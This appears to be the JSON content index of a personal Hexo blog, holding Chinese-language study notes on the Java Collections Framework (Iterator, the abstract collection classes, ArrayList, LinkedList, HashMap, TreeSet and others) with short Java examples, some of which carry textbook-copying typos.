{"meta":{"title":"Aotle","subtitle":"","description":"","author":"John Doe","url":"http://aotle.top","root":"/"},"pages":[{"title":"","date":"2020-11-28T11:58:23.737Z","updated":"2020-11-28T11:58:23.737Z","comments":true,"path":"googled87d322361ef5fd0.html","permalink":"http://aotle.top/googled87d322361ef5fd0.html","excerpt":"","text":"google-site-verification: googled87d322361ef5fd0.html"},{"title":"404 Not Found","date":"2020-06-21T05:10:01.101Z","updated":"2020-06-21T05:10:01.101Z","comments":true,"path":"404.html","permalink":"http://aotle.top/404.html","excerpt":"","text":"404 哎呀，您访问的页面走丢了呢 可能是输入地址有误或该地址已被删除"},{"title":"关于","date":"2020-12-01T11:12:14.873Z","updated":"2020-12-01T11:12:14.873Z","comments":true,"path":"about/index.html","permalink":"http://aotle.top/about/index.html","excerpt":"","text":".demo{ text-align: center; margin-bottom: 30px; } @-webkit-keyframes rotation{ from {-webkit-transform: rotate(0deg);} to {-webkit-transform: rotate(360deg);} } .an{ -webkit-transform: rotate(360deg); animation: rotation 3s linear infinite; -moz-animation: rotation 3s linear infinite; -webkit-animation: rotation 3s linear infinite; -o-animation: rotation 3s linear infinite; } .img{border-radius: 250px;} } 旧事大梦一场，不知苦饴。 你是北归的飞鸟，在如洗的岁月里居有一方天地。 我是南去的良鱼，在深遂的烟海底从此不知归期。 听闻路尽之后，便可各自忘记。 各有日落与晨曦，各有青山与白衣。 可后来我才知道， 路尽没有你，日落青山却是你。"},{"title":"所有分类","date":"2020-06-21T05:03:31.662Z","updated":"2020-06-21T05:03:31.662Z","comments":true,"path":"categories/index.html","permalink":"http://aotle.top/categories/index.html","excerpt":"","text":""},{"title":"友链","date":"2020-11-28T04:47:28.188Z","updated":"2020-11-28T04:47:28.188Z","comments":true,"path":"friends/index.html","permalink":"http://aotle.top/friends/index.html","excerpt":"","text":""},{"title":"","date":"2020-06-21T05:07:24.743Z","updated":"2020-06-21T05:07:24.743Z","comments":true,"path":"mylist/index.html","permalink":"http://aotle.top/mylist/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2020-06-21T05:06:16.504Z","updated":"2020-06-21T05:06:16.504Z","comments":true,"path":"tags/index.html","permalink":"http://aotle.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"JAVA集合复习-实现类","slug":"JAVA集合复习-实现类","date":"2020-12-04T06:48:52.000Z","updated":"2020-12-06T12:08:24.978Z","comments":true,"path":"2020/12/04/javajihe_shixian/","link":"","permalink":"http://aotle.top/2020/12/04/javajihe_shixian/","excerpt":"java集合实现类","text":"java集合实现类 实现类 arraylist 主要继承的接口如下： 1.Collection 接口： Collection接口是所有集合类的根节点，Collection表示一种规则，所有实现了Collection接口的类遵循这种规则 2.List 接口： List是Collection的子接口，它是一个元素有序(按照插入的顺序维护元素顺序)、可重复、可以为null的集合 3.AbstractCollection 类： Collection接口的骨架实现类，最小化实现了Collection接口所需要实现的工作量 4.AbstractList 类： List接口的骨架实现类，最小化实现了List接口所需要实现的工作量 5.Cloneable 接口： 实现了该接口的类可以显示的调用Object.clone()方法，合法的对该类实例进行字段复制，如果没有实现Cloneable接口的实例上调用Obejct.clone()方法，会抛出CloneNotSupportException异常。正常情况下，实现了Cloneable接口的类会以公共方法重写Object.clone() 6.Serializable 接口： 实现了该接口标示了类可以被序列化和反序列化，具体的 查询序列化详解 7.RandomAccess 接口： 实现了该接口的类支持快速随机访问 以数组实现。节约空间，但数组有容量限制。超出限制时会增加50%容量，用System.arraycopy()复制到新的数组，因此最好能给出数组大小的预估值。默认第一次插入元素时创建大小为10的数组。 按照数组索引访问元素：get(int index)/set(int index)的性能很高，这是数组的优势。直接在数组末尾加入元素：add(e)的性能也高，但如果按索引插入、删除元素：add(i,e)、remove(i)、remove(e)，则要用System.arraycopy()来移动部分受影响的元素，性能就变差了，这是数组的劣势。 ArrayList是线程不安全的，只能在单线程环境下，多线程环境下可以考虑用Collections.synchronizedList(List list)方法返回一个线程安全的ArrayList对象，也可以使用concurrent并发包下的CopyOnWriteArrayList类。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051add(a); //增加元素 add(index,a) //指定位置增加元素contains()//判断元素是否存在 get(index) //获取指定位置的对象 indexOf() //获取对象所处的位置 remove() //删除,可以根据下标，也可以根据对象删除 set(index,a) //替换 size() //获取大小 toArray() //转换为数组,需要传入一个对应类型的数组，否则只能返回Object数组 addAll(anotherlist) //把另一个容器所有对象都加进来 clear() //清空List&lt;class T&gt; a = new ArrayList&lt;class T&gt;();//遍历//for循环//foreach//迭代器for (int i = 0; i &lt; heros.size(); i++) &#123; Hero h = heros.get(i); System.out.println(h);&#125;while(it.hasNext())&#123; Hero h = it.next(); System.out.println(h);&#125;for (Iterator&lt;Hero&gt; iterator = heros.iterator(); iterator.hasNext();) &#123; Hero hero = (Hero) iterator.next(); System.out.println(hero);&#125;for (Hero h : heros) &#123; System.out.println(h);&#125;//双向迭代器List list = new ArrayList&lt;&gt;(); list.add(\"0\"); list.add(\"1\"); list.add(\"2\"); list.add(\"3\"); ListIterator iterator = list.listIterator(); System.out.println(\"--------------------向下遍历--------------------\"); while (iterator.hasNext()) &#123; int nextIndex = iterator.nextIndex(); String next = (String) iterator.next(); //int previousIndex = iterator.previousIndex(); System.out.println(\"当前元素：\"+next+\"，当前元素索引：\"+nextIndex/*+\"，前一个元素的索引\"+previousIndex*/); &#125; System.out.println(\"--------------------向上遍历--------------------\"); while (iterator.hasPrevious()) &#123; int previousIndex = iterator.previousIndex(); String previous = (String) iterator.previous(); System.out.println(\"当前元素：\"+previous+\"，当前元素索引：\"+previousIndex); &#125; linkedlist 1.Collection 接口： Collection接口是所有集合类的根节点，Collection表示一种规则，所有实现了Collection接口的类遵循这种规则 2.List 接口： List是Collection的子接口，它是一个元素有序(按照插入的顺序维护元素顺序)、可重复、可以为null的集合 3.AbstractCollection 类： Collection接口的骨架实现类，最小化实现了Collection接口所需要实现的工作量 4.AbstractList 类： List接口的骨架实现类，最小化实现了List接口所需要实现的工作量 5.Cloneable 接口： 实现了该接口的类可以显示的调用Object.clone()方法，合法的对该类实例进行字段复制，如果没有实现Cloneable接口的实例上调用Obejct.clone()方法，会抛出CloneNotSupportException异常。正常情况下，实现了Cloneable接口的类会以公共方法重写Object.clone() 6.Serializable 接口： 实现了该接口标示了类可以被序列化和反序列化，具体的 查询序列化详解 7.Deque 接口： Deque定义了一个线性Collection，支持在两端插入和删除元素，Deque实际是“double ended queue(双端队列)”的简称，大多数Deque接口的实现都不会限制元素的数量，但是这个队列既支持有容量限制的实现，也支持没有容量限制的实现，比如LinkedList就是有容量限制的实现,其最大的容量为Integer.MAX_VALUE 8.AbstractSequentialList 类： 提供了List接口的骨干实现，最大限度地减少了实现受“连续访问”数据存储(如链表)支持的此接口所需的工作，对于随机访问数据(如数组)，应该优先使用 AbstractList，而不是使用AbstractSequentailList类 • LinkedList()构造一个空链表。• LinkedList(Col 1ection&lt;? extends E&gt; elements)构造一个链表， 并将集合中所有的元素添加到这个链表中。• void addFirst(E element)• void addLast(E element)将某个元素添加到列表的头部或尾部。• E getFirst()• E getLast()返回列表头部或尾部的元素。• E removeFirst()• E removeLast()删除并返回列表头部或尾部的元素。 和arraylist比较 相同点 1.接口实现：都实现了List接口，都是线性列表的实现 2.线程安全：都是线程不安全的 不同点 1.底层实现:ArrayList内部是数组实现，而LinkedList内部实现是双向链表结构 2.接口实现：ArrayList实现了RandomAccess可以支持随机元素访问，而LinkedList实现了Deque可以当做队列使用 3.性能：新增、删除元素时ArrayList需要使用到拷贝原数组，而LinkedList只需移动指针，查找元素 ArrayList支持随机元素访问,而LinkedList只能一个节点的去遍历 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import java.util.Iterator;import java.util.LinkedList;import java.util.ListIterator;public class LinkedListApi &#123; public static void main(String[] args) &#123; LinkedList&lt;String&gt; linkedList = new LinkedList&lt;&gt;(); linkedList.add(\"D\"); linkedList.add(\"E\"); linkedList.add(\"G\"); linkedList.add(\"A\"); linkedList.add(\"H\"); System.out.println(linkedList); //[D, E, G, A, H] LinkedList&lt;String&gt; linkedList2 = new LinkedList&lt;&gt;(linkedList); // String key; key = linkedList.getFirst(); // 取表头 key = linkedList.getLast(); // 取表尾 key = linkedList.get(2); // 取index = 2 key = linkedList.peek(); // 取表头 key = linkedList.peekFirst(); // 取表头 key = linkedList.peekLast(); // 取表尾 boolean b = linkedList.remove(\"G\"); // 删除第一个给定元素 删除返回true key = linkedList.remove(3); // 删除index = 3 返回删除元素 key = linkedList.remove(); // 删除表头 返回删除元素 key = linkedList.removeFirst(); // 删除表头 返回表头 key = linkedList.removeLast(); // 删除表尾返回表尾 key = linkedList.poll(); // 删除表头返回 表头 key = linkedList.pollFirst(); // 删除表头返回 表头 key = linkedList.pollLast(); // 删除表尾 返回表尾 linkedList.push(\"44\"); // addFirst linkedList.addFirst(\"3\"); // 表头增加元素 linkedList.addLast(\"7\"); // 表尾增加元素 b = linkedList.contains(\"E\"); // 包含返回true int n = linkedList.size(); // 元素count b = linkedList.addAll(linkedList2); // 成功返回true System.out.println(linkedList); // [3, 44, 7, D, E, G, A, H] b = linkedList.addAll(3, linkedList2); // 从index = 3 增加 System.out.println(linkedList); linkedList.clear(); //清空 key = linkedList.set(4, \"EE\"); // 设定指定index 的值 System.out.println(key); b = linkedList.offer(\"3\"); // add b = linkedList.offerFirst(\"77\"); //addFirst b = linkedList.offerLast(\"22\"); // addLast b = linkedList.removeFirstOccurrence(\"E\"); // remove(\"E\") b = linkedList.removeLastOccurrence(\"3\"); // 删除最后一个 n = linkedList.indexOf(\"E\"); // 第一次出现的位置index n = linkedList.lastIndexOf(\"G\"); // 最后一次出现的位置index System.out.println(linkedList); // [77, 3, 44, 7, D, EE, G, A, H, D, G, A, H, 22] ListIterator&lt;String&gt; listIterator = linkedList.listIterator(); // 正向迭代器 while (listIterator.hasNext()) &#123; String string = listIterator.next(); //System.out.println(string); //D, EE, G, A, H, D, G, A, H, 22] &#125; while (listIterator.hasPrevious()) &#123; //反向迭代 String string = listIterator.previous(); //System.out.println(string); &#125; Object[] objects = linkedList.toArray(); // 转为对象数组 String[] strings = new String[1]; strings = linkedList.toArray(strings); // 转为数组 Object object = linkedList.clone(); // 浅拷贝 linkedList.add(3, \"EE\"); System.out.println(linkedList); &#125;&#125; hashset默认桶数是16，装填因子是0.75. 在 JavaSE 8 中， 桶满时会从链表变为平衡二叉树。如果选择的散列函数不当， 会产生很多冲突， 或者如果有恶意代码试图在散列表中填充多个有相同散列码的值， 这样就能提高性能。 import java.Iang.Object int hashCode( )返回这个对象的散列码。 散列码可以是任何整数， 包括正数或负数。equals 和 hashCode的定义必须兼容，即如果 x.equals(y) 为 true, x.hashCodeO 必须等于 y.hashCodeO。 • HashSet( )构造一个空散列表。• HashSet( Collection&lt;? extends E&gt; elements )构造一个散列集， 并将集合中的所有元素添加到这个散列集中。• HashSet( int initialCapacity)构造一个空的具有指定容量（桶数）的散列集。• HashSet(int initialCapacity , float loadFactor )构造一个具有指定容量和装填因子（一个 0.0 ~ 1.0 之间的数值， 确定散列表填充的百分比， 当大于这个百分比时， 散列表进行再散列）的空散列集。 treeset实现 Comparable 接口和NavigableSet 接口，使用红黑树排序，有序集合。 将一个元素添加到树中要比添加到散列表中慢， 参见表 9-3 中的比较，但是， 与检查数组或链表中的重复元素相比还是快很多。如果树中包含 n 个元素， 査找新元素的正确位置平均需要 logn 次比较。 例如， 如果一棵树包含了 1000 个元素，添加一个新元素大约需要比较10 次。 • TreeSet()• TreeSet(Comparator&lt;? super E&gt; comparator)构造一个空树集。• TreeSet(Collection&lt;? extends E&gt; elements)• TreeSet(SortedSet s)构造一个树集， 并增加一个集合或有序集中的所有元素（对于后一种情况， 要使用同样的顺序)。 NavigableSet 接口 • E higher(E value)• E lower(E value)返回大于 value 的最小元素或小于 value 的最大元素，如果没有这样的元素则返回 null。• E ceiling(E value)• E floor(E value)返回大于等于 vaiue 的最小元素或小于等于 value 的最大元素， 如果没有这样的元素则返回 null。• E pollFirst()• E pollLast删除并返回这个集中的最大元素或最小元素， 这个集为空时返回 null。• Iterator descendingIterator()返回一个按照递减顺序遍历集中元素的迭代器。 SortedSet 接口 • Comparator &lt;? super E&gt; comparator ()返回用于对元素进行排序的比较器。 如果元素用 Comparable 接口的 compareTo方法进行比较则返回 null。• E firs()• E 1ast()返回有序集中的最小元素或最大元素。 linkedhashset用来记住插人元素项的顺序。这样就可以避免在散列表中的项从表面上看是随机排列的。当条目插入到表中时，就会并人到双向链表中。和linkedhashmap类似…… 链接散列映射将用访问顺序， 而不是插入顺序， 对映射条目进行迭代。每次调用 get 或 put, 受到影响的条目将从当前的位置删除， 并放到条目链表的尾部（只有条目在链表中的位置会受影响， 而散列表中的桶不会受影响。一个条目总位于与键散列码对应的桶中）。要项构造这样一个的散列映射表， 请调用 1LinkedHashMap&lt;K, V&gt;(initialCapacity, loadFactor, true) 访问顺序对于实现高速缓存的“ 最近最少使用” 原则十分重要。例如， 可能希望将访问频率高的元素放在内存中， 而访问频率低的元素则从数据库中读取。当在表中找不到元素项且表又已经满时， 可以将迭代器加入到表中， 并将枚举的前几个元素删除掉。这些是近期最少使用的几个元素。甚至可以让这一过程自动化。即构造一个LinkedHashMap 的子类，然后覆盖下面这个方法： 1protected boolean removeEldestEntry(Map.Entry&lt;K， V&gt; eldest) 每当方法返回 true 时， 就添加一个新条目，从而导致删除 eldest 条目。例如，下面的高速缓存可以存放 100 个元素： 12345678Map&lt;K, V&gt; cache = new LinkedHashMap&lt;&gt;(128, 0.75F, true) &#123; protected boolean removeEldestEntry(Map.Entry&lt;K, V&gt; eldest) &#123; return size() &gt; 100; &#125;&#125;(); 另外，还可以对 eldest 条目进行评估，以此决定是否应该将它删除。 例如，可以检査与这个条目一起存在的时间戳。 LinkedHashSet() LinkedHashSet(int initialCapacity) LinkedHashSet(int initialCapacity, float loadFactor)用给定的容量和填充因子构造一个空链接散列集。 EmumSetEmimSet 是一个枚举类型元素集的高效实现。 由于枚举类型只有有限个实例， 所以EnumSet 内部用位序列实现。如果对应的值在集中， 则相应的位被置为 1。 EnumSet 类没有公共的构造器。可以使用静态工厂方法构造这个集： 12345enum Weekday &#123; MONDAY, TUESDAY, WEDNESDAY, THURSDAY, FRIDAY, SATURDAY, SUNDAY &#125;;EnumSet&lt;Weekday&gt; always = EnumSet.allOf(Weekday.class);EnumSet&lt;Weekday&gt; never = EnumSet.noneOf(Weekday.class);EnumSet&lt;Weekday&gt; workday = EnumSet.range(Weekday.MONDAY, Weekday.FRIDAY);EnumSet&lt;Weekday&gt; mwf = EnumSet.of(Weekday.MONDAY, Weekday.WEDNESDAY, Weekday.FRIDAY); 可以使用 Set 接口的常用方法来修改 EnumSet。 static &lt; E extends Enum&gt;EnumSet allOf(Class enumType)返回一个包含给定枚举类型的所有值的集。 static &lt; E extends Enum&gt; EnumSet noneOf(Class&lt; E&gt; enumType)返回一个空集，并有足够的空间保存给定的枚举类型所有的值。 static &lt; E extends Enum&gt; EnumSet range(E from, E to)返回一个包含 from 〜 to 之间的所有值（包括两个边界元素）的集。 static &lt; E extends Enum&gt; EnumSet of(E value) static &lt;E extends Enum&gt; EnumSet of(E value, E… values)返回包括给定值的集。 hashmapkey不可以重复，value可以重复。它根据键的hashCode值存储数据，大多数情况下可以直接定位到它的值，因而具有很快的访问速度，但遍历顺序却是不确定的。 HashMap最多只允许一条记录的键为null，允许多条记录的值为null。HashMap非线程安全，即任一时刻可以有多个线程同时写HashMap，可能会导致数据的不一致。如果需要满足线程安全，可以用 Collections的synchronizedMap方法使HashMap具有线程安全的能力，或者使用ConcurrentHashMap。 //遍历 staff.forEach((k, v) -&gt;System.out.println(“key=” + k + “ value:” + v)); • HashMap()• HashMap(int initialCapacity)• HashMap(int initialCapacity, float loadFactor)用给定的容量和装填因子构造一个空散列映射（装填因子是一个 0.0 〜 1.0 之间的数值。这个数值决定散列表填充的百分比。一旦到了这个比例， 就要将其再散列到更大的表中）。默认的装填因子是 0.75。 treemapTreeMap实现SortedMap接口，能够把它保存的记录根据键排序，默认是按键值的升序排序，也可以指定排序的比较器，当用Iterator遍历TreeMap时，得到的记录是排过序的。如果使用排序的映射，建议使用TreeMap。在使用TreeMap时，key必须实现Comparable接口或者在构造TreeMap传入自定义的Comparator，否则会在运行时抛出java.lang.ClassCastException类型的异常。 • TreeMap()为实现 Comparable 接口的键构造一个空的树映射。• TreeMap(Comparator&lt;? super K&gt; c)构造一个树映射， 并使用一个指定的比较器对键进行排序。• TreeMap(Map&lt;? extends K , ? extends V&gt; entries)构造一个树映射， 并将某个映射中的所有条目添加到树映射中。• TreeMap(SortedMap&lt;? extends K, ? extends V&gt; entries)构造一个树映射， 将某个有序映射中的所有条目添加到树映射中， 并使用与给定的有序映射相同的比较器。 EnumMapEnumMap 是一个键类型为枚举类型的映射。 它可以直接且高效地用一个值数组实现。在使用时， 需要在构造器中指定键类型： 1EnumMap&lt;Weekday, Employee〉personlnCharge = new EnumMapo(Weekday.class); EnumMap(Class keyType)构造一个键为给定类型的空映射。 linkedhashmapLinkedHashMap是HashMap的一个子类，保存了记录的插入顺序，在用Iterator遍历LinkedHashMap时，先得到的记录肯定是先插入的，也可以在构造时带参数，按照访问次序排序。 链接散列映射将用访问顺序， 而不是插入顺序， 对映射条目进行迭代。每次调用 get 或 put, 受到影响的条目将从当前的位置删除， 并放到条目链表的尾部（只有条目在链表中的位置会受影响， 而散列表中的桶不会受影响。一个条目总位于与键散列码对应的桶中）。要项构造这样一个的散列映射表， 请调用 1LinkedHashMap&lt;K, V&gt;(initialCapacity, loadFactor, true) 访问顺序对于实现高速缓存的“ 最近最少使用” 原则十分重要。例如， 可能希望将访问频率高的元素放在内存中， 而访问频率低的元素则从数据库中读取。当在表中找不到元素项且表又已经满时， 可以将迭代器加入到表中， 并将枚举的前几个元素删除掉。这些是近期最少使用的几个元素。甚至可以让这一过程自动化。即构造一个LinkedHashMap 的子类，然后覆盖下面这个方法： 1protected boolean removeEldestEntry(Map.Entry&lt;K， V&gt; eldest) 每当方法返回 true 时， 就添加一个新条目，从而导致删除 eldest 条目。例如，下面的高速缓存可以存放 100 个元素： 12345678Map&lt;K, V&gt; cache = new LinkedHashMap&lt;&gt;(128, 0.75F, true) &#123; protected boolean removeEldestEntry(Map.Entry&lt;K, V&gt; eldest) &#123; return size() &gt; 100; &#125;&#125;(); 另外，还可以对 eldest 条目进行评估，以此决定是否应该将它删除。 例如，可以检査与这个条目一起存在的时间戳。 LinkedHashMap() LinkedHashMap(int initialCapacity) LinkedHashMap(int initialCapacity, float loadFactor) LinkedHashMap(int initialCapacity, float loadFactor, boolean accessOrder)用给定的容量、 填充因子和顺序构造一个空的链接散列映射表。accessOrder 参数为 true 时表示访问顺序， 为 false 时表示插入顺序。 protected boolean removeEldestEntry(Map.Entry&lt;K, V &gt; eldest)如果想删除 eldest 元素， 并同时返回 true, 就应该覆盖这个方法。eldest 参数是预期要删除的条目。这个方法将在条目添加到映射中之后调用。其默认的实现将返回 false。即在默认情况下，旧元素没有被删除。然而， 可以重新定义这个方法， 以便有选择地返回 true。例如， 如果最旧的条目符合一个条件， 或者映射超过了一定大小， 则返回true。 WeakHashMap设计 WeakHashMap 类是为了解决一个有趣的问题。 如果有一个值，对应的键已经不再使用了， 将会出现什么情况呢？ 假定对某个键的最后一次引用已经消亡，不再有任何途径引用这个值的对象了。但是， 由于在程序中的任何部分没有再出现这个键， 所以， 这个键 / 值对无法从映射中删除。为什么垃圾回收器不能够删除它呢？ 难道删除无用的对象不是垃圾回收器的工作吗？遗憾的是， 事情没有这样简单。 垃圾回收器跟踪活动的对象。只要映射对象是活动的，其中的所有桶也是活动的， 它们不能被回收。 因此， 需要由程序负责从长期存活的映射表中删除那些无用的值。 或者使用WeakHashMap 完成这件事情。 当对键的唯一引用来自散列条目时， 这一数据结构将与垃圾回收器协同工作一起删除键 / 值对。下面是这种机制的内部运行情况。WeakHashMap 使用弱引用 （weak references) 保存键。WeakReference 对象将引用保存到另外一个对象中， 在这里， 就是散列键。 对于这种类型的对象， 垃圾回收器用一种特有的方式进行处理。通常， 如果垃圾回收器发现某个特定的对象已经没有他人引用了， 就将其回收。然而， 如果某个对象只能由 WeakReference 引用， 垃圾回收器仍然回收它，但要将引用这个对象的弱引用放人队列中。WeakHashMap 将周期性地检查队列， 以便找出新添加的弱引用。一个弱引用进人队列意味着这个键不再被他人使用， 并且已经被收集起来。于是， WeakHashMap 将删除对应的条目。 WeakHashMap() WeakHashMap(int initialCapacity) WeakHashMap(int initialCapacity, float loadFactor)用给定的容量和填充因子构造一个空的散列映射表。 IdentifyHashMap类 IdentityHashMap 有特殊的作用。 在这个类中， 键的散列值不是用 hashCode 函数计算的， 而是用 System.identityHashCode 方法计算的。 这是 Object.hashCode 方法根据对象的内存地址来计算散列码时所使用的方式。 而且， 在对两个对象进行比较时， IdentityHashMap 类使用 ==, 而不使用 equals。也就是说， 不同的键对象， 即使内容相同， 也被视为是不同的对象。 在实现对象遍历算法 （如对象串行化）时， 这个类非常有用， 可以用来跟踪每个对象的遍历状况。 IdentityHashMap() IdentityHashMap(int expectedMaxSize)构造一个空的标识散列映射集，其容量是大于 1.5 * expectedMaxSize 的 2 的最小次幂(expectedMaxSize 的默认值是 21 )。 ArrayDeque数组实现双端队列，实现了Deque接口，链表实现是linkedlist。 • ArrayDeque( )• ArrayDeque( 1nt initialCapacity) 用初始容量 16 或给定的初始容量构造一个无限双端队列。 PriorityQueue优先级队列 • PriorityQueue()• PriorityQueue(int initialCapacity)构造一个用于存放 Comparable 对象的优先级队列。• Pr1orityQueue(int initialCapacity, Comparator &lt;? super E&gt; c)构造一个优先级队列， 并用指定的比较器对元素进行排序。 集合工具类Collections:集合框架的工具类。里面定义的都是静态方法。 Collections和Collection有什么区别？Collection是集合框架中的一个顶层接口，它里面定义了单列集合的共性方法。Collections是集合框架中的一个工具类，就如同Arrays是数组的工具类，该类中的方法都是静态的。提供的方法中有可以对list集合进行排序，二分查找等方法。通常常用的集合都是线程不安全的。因为要提高效率。如果多线程操作这些集合时，可以通过该工具类中的同步方法，将线程不安全的集合，转换成安全的。 1234567Collections.reverse(numbers);//使list中的数据反转Collections.shuffle(numbers);//混淆list中的数据Collections.sort(numbers); //排序Collections.swap(numbers,0,5);//交换Collections.rotate(numbers,2);//滚动，向右滚动指定的单位长度List&lt;Integer&gt; synchronizedNumbers = (List&lt;Integer&gt;) Collections.synchronizedList(numbers);//把非线程安全的List转换为线程安全的List","categories":[{"name":"java","slug":"java","permalink":"http://aotle.top/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"http://aotle.top/tags/java/"}]},{"title":"JAVA集合复习-抽象类","slug":"JAVA集合复习-抽象类","date":"2020-12-04T06:48:43.000Z","updated":"2020-12-04T08:42:05.535Z","comments":true,"path":"2020/12/04/javajihe_chouxiang/","link":"","permalink":"http://aotle.top/2020/12/04/javajihe_chouxiang/","excerpt":"java集合抽象类","text":"java集合抽象类 抽象类abstractcollection1public abstract class AbstractCollection&lt;E&gt; implements Collection&lt;E&gt; AbstractCollection是一个抽象类，它实现了Collection中除iterator()和size()之外的函数。AbstractCollection的主要作用：它实现了Collection接口中的大部分函数。从而方便其它类实现Collection，比如ArrayList、LinkedList等，它们这些类想要实现Collection接口，通过继承AbstractCollection就已经实现了大部分的接口了。 abstractlist1public abstract class AbstractList&lt;E&gt; extends AbstractCollection&lt;E&gt; implements List&lt;E&gt; AbstractList是一个继承于AbstractCollection，并且实现List接口的抽象类。它实现了List中除size()、get(int location)之外的函数。AbstractList的主要作用：它实现了List接口中的大部分函数。从而方便其它类继承List。另外，和AbstractCollection相比，AbstractList抽象类中，实现了iterator()接口。 abstractset1public abstract class AbstractSet&lt;E&gt; extends AbstractCollection&lt;E&gt; implements Set&lt;E&gt; AbstractSet是一个继承于AbstractCollection，并且实现Set接口的抽象类。由于Set接口和Collection接口中的API完全一样，Set也就没有自己单独的API。和AbstractCollection一样，它实现了List中除iterator()和size()之外的函数。AbstractSet的主要作用：它实现了Set接口中的大部分函数。从而方便其它类实现Set接口。 abstractmap1public abstract class AbstractMap&lt;K, V&gt; implements Map&lt;K, V&gt; 对应于AbstractCollection，AbstractMap的作用也是类似的，主要是针对 Map 提供一些方法的通用实现。如果需要实现一个不可修改的 Map，只需要继承 AbstractMap 并重写 entrySet 方法。entrySet 方法返回的 Set 集合不应该支持 add、remove 方法，其迭代器也不应该支持 remove 方法。要实现可修改的 Map，必须重写此类的 put 方法（AbstractMap 默认抛出 UnsupportedOperationException 异常）和 entrySet 方法。iterator 方法返回的迭代器必须实现 remove 方法。 entrySet 方法在 AbstractMap 中仍然是一个抽象方法。 1public abstract Set&lt;Entry&lt;K,V&gt;&gt; entrySet(); 另外在 AbstractMap 中定义了两个变量，这两个变量在 AbstractMap 的子类 HashMap、TreeMap 都有用到。被用来存储返回的集合视图。 1234// 存储 key 集合transient Set&lt;K&gt; keySet;// 存储 valuestransient Collection&lt;V&gt; values; abstractsequentiallist（ Sequential 相继的，按次序的） AbstractSequentialList 继承自 AbstractList，是 LinkedList 的父类，是 List 接口 的简化版实现。 简化在哪儿呢？简化在 AbstractSequentialList 只支持按次序访问，而不像 AbstractList 那样支持随机访问。 想要实现一个支持按次序访问的 List的话，只需要继承这个抽象类，然后把指定的抽象方法实现就好了。需要实现的方法： size() listIterator()，返回一个 ListIterator 你需要实现一个 ListIterator, 实现它的 hasNext(), hasPrevious(), next(), previous(), 还有那几个 获取位置 的方法，这样你就得到一个不可变的 ListIterator 了。如果你想让它可修改，还需要实现 add(), remove(), set() 方法。 正如在 每个 Collection 接口 中提倡的那样，AbstractSequentialList 的子类需要提供两个构造函数，一个无参，一个以 Collection 为参数。","categories":[{"name":"java","slug":"java","permalink":"http://aotle.top/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"http://aotle.top/tags/java/"}]},{"title":"JAVA集合复习-接口","slug":"JAVA集合复习-接口","date":"2020-12-03T11:44:56.000Z","updated":"2020-12-06T12:02:49.056Z","comments":true,"path":"2020/12/03/javajihe_jiekou/","link":"","permalink":"http://aotle.top/2020/12/03/javajihe_jiekou/","excerpt":"java集合","text":"java集合 一：总览 上述类图中，实线边框的是实现类，比如ArrayList，LinkedList，HashMap等，折线边框的是抽象类，比如AbstractCollection，AbstractList，AbstractMap等，而点线边框的是接口，比如Collection，Iterator，List等。 主要接口：iterator，listiterator(图片有错误)，collection，map，list，set，queue，sortedmap，sortedset…… 抽象类：abstractcollection，abstractlist，abstractset，abstractmap，abstractsequentiallist 实现类（主要掌握）：arraylist，linkedlist，hashset，treeset，linkedhashset，hashmap，treemap，linkedhashmap。 二：详解接口 iterator接口1234567891011121314151617181920public interface Iterator&lt;E&gt; &#123; boolean hasNext(); E next(); void remove();&#125;//请求一个迭代器Collection&lt;String&gt; c = . . .;Iterator&lt;String&gt; iter = c.iteratorO；while (iter.hasNextO)&#123;String element = iter.next0；do something with element&#125;//使用for each 必须实现Iterable接口for (String element : c)&#123;do something with element&#125;//使用lambda表达式iterator.forEachRemaining(element -&gt; dosomething with element); • boolean hasNext()如果存在可访问的元素， 返回 true。• E next()返回将要访问的下一个对象。 如果已经到达了集合的尾部， 将拋出一个 NoSuchElementException。• void remove( )删除上次访问的对象。这个方法必须紧跟在访问一个元素之后执行。如果上次访问之后，集合已经发生了变化， 这个方法将抛出一个 IllegalStateException。 iterator 接口的 remove 方法将会删除上次调用 next 方法时返回的元素。 只能向前遍历，无法反向。 应该将 Java 迭代器认为是位于两个元素之间。 当调用 next 时，迭代器就越过下一个元素，并返回刚刚越过的那个元素的引用。 Iterable接口123public interface Iterable&lt;T&gt; &#123; Iterator&lt;T&gt; iterator();&#125; 所有的集合类（List、Set…）都实现自Collection 接口，而Collection 接口又继承于Iterable 接口，因此可以说所有的集合类（List、Set…）都实现了Iterable 接口。 当某个类实现Iterable接口时，我们就能称这个类是一个“可数”的类，也就是可以使用iterator()获取一个迭代器Iterator，然后使用这个Iterator实例去遍历这个类，因此所有的Collection类都能够使用迭代器Iterator来遍历。 如果某个类实现了Iterable 接口，那么他也需要创建一个内部类去实现一个Iterator 类，让调用Iterable 接口中的iterator() 时，能够获取到一个iterator 实例。 而再进一步说，当某个类能使用迭代器Iterator来遍历时，就能使用java提供的foreach语法糖来遍历此类（foreach语法糖其实就是简化的iterator()） foreach实际上会被编译器编译成使用迭代器iterator()去遍历集合，因此能使用foreach的，都是得实现Iterable接口的集合类Collection们，像是List、Set 所以Map就没有办法直接使用foreach（因为Map没有实现Iterable接口），只有他的map.entrySet()、map.keySet()、map.values()这种返回一个集合类的方法，才能使用foreach。 为什么Iterator 要额外使用内部类去实现，而不是ArrayList 直接实现此接口 ? 如果看过Collection类的源码（以ArrayList为例），可以发现ArrayList类并不是由ArrayList去实现Iterator接口，而是ArrayList有一个内部类Itr，专门去实现Iterator接口，而ArrayList的iterator()方法，只是去创建一个内部类ArrayList.Itr的实例而已 12345678910111213141516//ArrayList不實現Iterator接口，反而是由他的內部類進行實現public class ArrayList&lt;E&gt; extends AbstractList&lt;E&gt; &#123; //調用list.iterator()可以取得此list的迭代器 public Iterator&lt;E&gt; iterator() &#123; return new Itr(); //實際上就是去創建一個內部類的實例 &#125; //ArrayList中的內部類Itr，專門實現Iterator接口 private class Itr implements Iterator&lt;E&gt; &#123; int cursor; //記錄當前迭代到哪裡 public boolean hasNext() &#123; ... &#125; public E next() &#123; ... &#125; public void remove() &#123; ... &#125; &#125;&#125; 